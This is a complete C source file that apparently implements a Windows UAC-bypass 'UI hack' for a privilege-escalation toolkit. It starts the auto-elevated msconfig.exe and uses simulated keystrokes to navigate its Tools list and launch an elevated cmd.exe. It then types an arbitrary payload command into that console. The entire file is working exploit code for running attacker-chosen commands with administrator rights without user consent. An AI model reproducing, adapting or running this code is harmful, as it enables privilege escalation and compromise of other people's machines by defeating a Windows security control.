/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2019
*
*  TITLE:       UIHACKS.C
*
*  VERSION:     3.19
*
*  DATE:        22 May 2019
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "fubuki.h"

//#define FUBUKI_TRACE_CALL

#ifdef FUBUKI_TRACE_CALL
VOID ucmxSendInput(
    _In_ UINT cInputs,                  
    _In_reads_(cInputs) LPINPUT pInputs,
    _In_ int cbSize)
{
    WCHAR szOut[200];
    UINT r = SendInput(cInputs, pInputs, cbSize);

    _strcpy(szOut, L"SendInput = ");
    ultostr(r, _strend(szOut));
    _strcat(szOut, L" GetLastError = ");
    ultostr(GetLastError(), _strend(szOut));
    _strcat(szOut, L"\r\n");
    OutputDebugString(szOut);
}
#else
#define ucmxSendInput SendInput
#endif

/*
* ucmxSendControlInput
*
* Purpose:
*
* Send input to the foreground window.
*
*/
VOID ucmxSendControlInput(
    _In_ WORD VkKey,
    _In_ BOOL UseShift)
{
    INPUT ip;

    ip.type = INPUT_KEYBOARD;
    ip.ki.wScan = 0;
    ip.ki.time = 0;
    ip.ki.dwExtraInfo = 0;
    ip.ki.dwFlags = 0;

    if (UseShift) {
        ip.ki.wVk = VK_LSHIFT;
        ucmxSendInput(1, &ip, sizeof(INPUT));
    }

    ip.ki.wVk = VkKey;
    ucmxSendInput(1, &ip, sizeof(INPUT));

    ip.ki.dwFlags = KEYEVENTF_KEYUP;
    ucmxSendInput(1, &ip, sizeof(INPUT));

    if (UseShift) {
        ip.ki.wVk = VK_LSHIFT;
        ip.ki.dwFlags = KEYEVENTF_KEYUP;
        ucmxSendInput(1, &ip, sizeof(INPUT));
    }
}

/*
* ucmxSendKeys
*
* Purpose:
*
* Send keys to foreground window.
*
*/
VOID ucmxSendKeys(
    _In_ LPWSTR lpString)
{
    BOOL NeedShift;
    SIZE_T i;
    WORD VkAndShift;

    HKL kl = LoadKeyboardLayout(TEXT("en-US"), KLF_ACTIVATE);

    for (i = 0; i < _strlen(lpString); i++) {
        VkAndShift = VkKeyScanEx(lpString[i], kl);
        NeedShift = ((HIBYTE(VkAndShift) & 1) == 1);
        ucmxSendControlInput(LOBYTE(VkAndShift), NeedShift);
    }
}

/*
* ucmxElevatedConsoleCallback
*
* Purpose:
*
* Callback used to locate window of elevated console.
*
*/
BOOL CALLBACK ucmxElevatedConsoleCallback(
    _In_ HWND   hwnd,
    _In_ LPARAM lParam
)
{
    BOOL Elevated = FALSE;
    DWORD dwPid;
    LPWSTR lpPayload = (LPWSTR)lParam;
    WCHAR szBuffer[MAX_PATH + 1];

    if (GetClassName(hwnd, (LPWSTR)szBuffer, MAX_PATH)) {
        if (_strcmpi(szBuffer, TEXT("ConsoleWindowClass")) == 0) {
            if (GetWindowThreadProcessId(hwnd, &dwPid)) {
                if (NT_SUCCESS(ucmIsProcessElevated(dwPid, &Elevated))) {
                    if (Elevated) {
                        ucmxSendKeys(lpPayload);
                        ucmxSendControlInput(VK_RETURN, FALSE);
                        return TRUE;
                    }
                }
            }
        }
    }

    return FALSE;
}

/*
* ucmxEnumChildCallback
*
* Purpose:
*
* EnumChildWindows callback used to send keys to msconfig and cmd.
*
*/
BOOL CALLBACK ucmxEnumChildCallback(
    _In_ HWND   hwnd,
    _In_ LPARAM lParam
)
{
    UINT i;
    HWND hwndButton, hwndList;

    //
    // Find msconfig tools listview.
    //
    hwndList = FindWindowEx(hwnd, NULL, TEXT("SysListView32"), TEXT("List1"));
    if (hwndList) {

        //SetFocus(hwndList);

        //
        // Navigate to cmd.exe entry in msconfig listview.
        //
        for (i = 0; i < 14; i++) {
            ucmxSendControlInput(VK_DOWN, FALSE);
        }

        hwndButton = GetDlgItem(hwnd, 302);
        if (hwndButton == NULL)
            hwndButton = GetDlgItem(hwnd, 1117);

        if (hwndButton) {

            //
            // Navigate to "Launch" button.
            //
            ucmxSendControlInput(VK_TAB, FALSE);
            ucmxSendControlInput(VK_TAB, FALSE);

            //
            // Press "Launch" button.
            //
            ucmxSendControlInput(VK_RETURN, FALSE);
            Sleep(1000);
            //
            // Send input to elevated console.
            //
            ucmxElevatedConsoleCallback(GetForegroundWindow(), lParam);

            return FALSE;
        }
#ifdef FUBUKI_TRACE_CALL
        else {
            OutputDebugString(L"GetDlgItem(BUTTON) failed\r\n");
        }
#endif
    }

    return TRUE;
}

/*
* ucmxFindMainMsConfigWindow
*
* Purpose:
*
* EnumWindows callback used to locate msconfig dialog window.
*
*/
BOOL CALLBACK ucmxFindMainMsConfigWindow(
    _In_ HWND   hwnd,
    _In_ LPARAM lParam
)
{
    PSEARCH_WND SearchWnd = (PSEARCH_WND)lParam;

    WCHAR szClassName[MAX_PATH * 2];

    DWORD dwPid;
    DWORD dwTargetPid = SearchWnd->ProcessId;

    GetWindowThreadProcessId(hwnd, &dwPid);
    if (dwPid == dwTargetPid) {

        if (GetClassName(hwnd, szClassName, MAX_PATH)) {

            if (_strcmpi(szClassName, TEXT("#32770")) == 0) {
                SearchWnd->hWnd = hwnd;
                return FALSE;
            }
        }
    }

    return TRUE;
}

/*
* ucmxGetHwndForMsConfig
*
* Purpose:
*
* Return dialog hwnd of msconfig.
*
*/
HWND ucmxGetHwndForMsConfig(
    _In_ ULONG ProcessId
)
{
    SEARCH_WND SearchWnd;

    SearchWnd.ProcessId = ProcessId;
    SearchWnd.hWnd = NULL;
    if (!EnumWindows(ucmxFindMainMsConfigWindow, (LPARAM)&SearchWnd)) {
        return SearchWnd.hWnd;
    }
    return NULL;
}

/*
* ucmUIHackExecute
*
* Purpose:
*
* Force msconfig to spawn elevated cmd copy via gui-hack and gui-hack it too.
*
*/
VOID ucmUIHackExecute(
    _In_ LPWSTR lpPayload
)
{
    HWND hwndDlg;
    SHELLEXECUTEINFO shinfo;
    PROCESS_BASIC_INFORMATION pbi;
    WCHAR szBuffer[MAX_PATH * 2];

    _strcpy(szBuffer, USER_SHARED_DATA->NtSystemRoot);
    _strcat(szBuffer, SYSTEM32_DIR);
    _strcat(szBuffer, MSCONFIG_EXE);

    RtlSecureZeroMemory(&shinfo, sizeof(shinfo));
    shinfo.cbSize = sizeof(shinfo);
    shinfo.fMask = SEE_MASK_NOCLOSEPROCESS;
    shinfo.lpFile = szBuffer;
    shinfo.lpParameters = TEXT("-5");
    shinfo.nShow = SW_SHOW;
    if (ShellExecuteEx(&shinfo)) {

        RtlSecureZeroMemory(&pbi, sizeof(PROCESS_BASIC_INFORMATION));
        if (NT_SUCCESS(NtQueryInformationProcess(shinfo.hProcess,
            ProcessBasicInformation,
            (PVOID)&pbi,
            sizeof(PROCESS_BASIC_INFORMATION),
            NULL)))
        {
            Sleep(1000);
            hwndDlg = ucmxGetHwndForMsConfig((ULONG)pbi.UniqueProcessId);
            if (hwndDlg) {
                EnumChildWindows(hwndDlg, ucmxEnumChildCallback, (LPARAM)lpPayload);
            }
        }

        TerminateProcess(shinfo.hProcess, 0);
        CloseHandle(shinfo.hProcess);
    }
}
